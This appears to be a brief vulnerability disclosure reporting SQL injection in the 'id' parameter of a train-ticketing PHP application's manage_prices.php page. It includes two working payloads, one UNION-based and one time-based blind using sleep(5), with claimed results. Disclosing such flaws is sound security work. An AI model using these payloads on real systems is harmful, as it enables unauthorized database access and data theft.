BUG_Author：syr14

Vulnerability File: /train_ticketing/manage_prices.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: id=1 union all select null,concat(0x616263,0x7576777879),null-- -

The union query is successful, which proves that there is SQL injection.

![image](https://github.com/shiyur14/bugReport/blob/main/sql.png)

Payload2: id=1 and(select 5 from (select(sleep(5)))e)

The response time of the server is 5 seconds, which proves that there is SQL injection.

![image](https://github.com/shiyur14/bugReport/blob/main/sql1.png)
